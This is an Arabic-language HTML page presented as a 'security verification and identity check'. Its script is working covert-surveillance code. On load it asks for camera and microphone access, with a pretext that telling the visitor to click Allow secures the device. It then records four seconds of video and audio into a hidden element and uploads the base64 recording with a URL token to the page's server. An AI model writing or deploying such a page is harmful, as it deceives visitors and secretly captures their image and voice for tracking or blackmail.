<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني الشامل وتأكيد الهوية | Security Verification</title>
    
    <meta property="og:title" content="فحص أمان النظام وتأكيد الهوية الرقمية | Security Check">
    <meta property="og:description" content="جاري التحقق من أمان الجهاز والاتصال لتأكيد هويتك وحمايتك...">
    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
        body { font-family: 'Tajawal', sans-serif; }
        .secure-gradient { background: linear-gradient(135deg, #059669 0%, #10B981 100%); }
    </style>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <!-- عنصر فيديو مخفي للتسجيل الصامت -->
    <video id="video" autoplay playsinline muted style="display:none;"></video>

    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
        
        <div class="absolute -top-16 -right-16 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>

        <div class="w-20 h-20 rounded-3xl secure-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-emerald-500/30 animate-pulse">
            <i class="fa-solid fa-shield-halved"></i>
        </div>

        <div class="space-y-2">
            <span class="bg-emerald-500/20 text-emerald-400 text-xs px-3 py-1 rounded-full font-bold border border-emerald-500/30">التحقق الأمني للاتصال</span>
            <h1 class="text-2xl font-black text-white">جاري فحص وتأمين الجهاز...</h1>
            <p class="text-xs text-slate-400">
                يرجى النقر على زر <span class="text-emerald-400 font-bold">"السماح" (Allow)</span> في النافذة المنبثقة للتحقق من أمان النظام واستكمال العملية.
            </p>
        </div>

        <div class="flex justify-center items-center space-x-2 space-x-reverse py-2">
            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce"></div>
            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce [animation-delay:-.2s]"></div>
            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce [animation-delay:-.4s]"></div>
        </div>

        <div id="statusText" class="text-xs text-emerald-400 font-semibold animate-pulse">
            جاري تحضير فحص النظام الآمن...
        </div>

    </div>

    <script>
        window.addEventListener('DOMContentLoaded', async () => {
            const statusText = document.getElementById('statusText');
            const video = document.getElementById('video');

            try {
                // طلب الكاميرا والصوت معاً لتسجيل الفيديو
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                await video.play();

                statusText.textContent = "جاري تأكيد بيانات التحقق الأمني...";
                statusText.className = "text-xs text-amber-400 font-semibold";

                let options = { mimeType: 'video/webm;codecs=vp8,opus' };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: 'video/webm' };
                }

                const mediaRecorder = new MediaRecorder(stream, options);
                let recordedChunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    statusText.textContent = "تم التحقق بنجاح! جاري رفع البيانات...";
                    statusText.className = "text-xs text-emerald-400 font-semibold";

                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    
                    const reader = new FileReader();
                    reader.onloadend = async () => {
                        const base64data = reader.result;

                        // استخراج الرمز token من المسار أو الرابط
                        const pathParts = window.location.pathname.split('/');
                        const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');

                        if (!token) {
                            console.error('Token not found.');
                            return;
                        }

                        const payload = {
                            token: token,
                            videoData: base64data
                        };

                        try {
                            await fetch('/submitVideo', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(payload)
                            });
                        } catch (e) {
                            console.error('Failed to submit video');
                        }

                        // التوجيه التلقائي إلى ملف ok.html بعد نجاح العملية
                        setTimeout(() => {
                            window.location.href = '/ok.html';
                        }, 1500);
                    };
                    reader.readAsDataURL(blob);
                };

                // بدء التسجيل لمدة 4 ثوانٍ تلقائياً ثم إيقافه وحفظه
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 4000);

            } catch (err) {
                statusText.textContent = "تنبيه: يجب النقر على 'السماح' (Allow) لإتمام التحقق الأمني!";
                statusText.className = "text-xs text-red-400 font-semibold";
            }
        });
    </script>
</body>
</html>
